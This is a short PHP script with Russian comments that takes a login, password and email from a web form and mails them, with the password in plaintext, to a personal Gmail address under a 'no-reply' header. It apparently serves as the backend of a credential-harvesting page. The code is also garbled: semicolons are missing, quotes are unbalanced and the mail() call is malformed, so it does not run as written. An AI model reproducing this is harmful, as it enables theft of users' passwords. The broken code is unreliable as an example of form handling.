<?php 

//получим данные
	$login = $_POST['login'] 
	$pass = $_POST['pass'] 
	$email = $_POST['email'] 
//обработка
	$login = htmlspecialchars($login)
	$pass = htmlspecialchars($pass)
	$email = htmlspecialchars($email)

	$login = urldecode($login)
	$pass = urldecode($pass)
	$email = urldecode($email)

	$login = trim($login)
	$pass = trim($pass)
	$email = trim($email)

	//отправляем данные

	if (mail("pavellpasa@gmail.com",
 			"новое письмо с сайта,"
 			"login: = $login."\n.
 			"password = $pass"."\n.
 			email = $email"."\n.
 			"form: no-reply@ydomian.ru		\r\n")

 	")a) {
		echo ("письмо отправлено");
 	}

 	else {
 		echo ("ошибка D");
 	}
?>